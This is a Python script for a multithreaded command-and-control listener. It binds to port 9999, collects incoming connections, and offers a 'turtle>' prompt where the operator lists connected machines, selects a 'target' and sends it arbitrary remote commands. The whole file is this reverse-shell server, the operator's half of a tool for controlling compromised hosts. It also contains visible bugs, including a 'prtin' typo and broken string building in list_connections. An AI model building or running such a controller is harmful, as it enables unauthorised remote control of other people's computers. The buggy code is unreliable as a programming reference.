import socket
import sys
import threading
from queue import Queue
import time

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []


# Create a socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print('Socket Creation error:', msg)


# Bind socket to port and wait for connction from client
def socket_bind():
    try:
        global host
        global port
        global s
        print('binding socket to port:', port)
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print('Socket Binding Error:', msg, "\n", 'Retrying...')


# Accept connections from multiple clients and save to list
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print('\nConnection has been extablished', address[0])
        except:
            print('Error accepting connections')


# Interavtice Prompt for sending commands remotely
def start_turtle():
    while True:
        cmd = input('turtle>')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print('Command not recognized')


# DIsplays all current connections
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += i, '  ', all_addresses[i][
            0], '  ', all_addresses[i][1], '\n'
    print('------ Clients ------\n' + results)


# Select a target client
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print('You are now connected to', all_addresses[target][0])
        print(all_addresses[target][0], ">", end="")
        return conn
    except:
        print('Not a valid selection')
        return None


# connect with remote target client
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                prtin(client_response, end="")
            if cmd == 'quit':
                break
        except:
            print('Connection Lost')
            break


# create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# do the next job in the queue (one handles connections the other sends
# commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_turtle()
        queue.task_done()


# Each list item is a new job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()
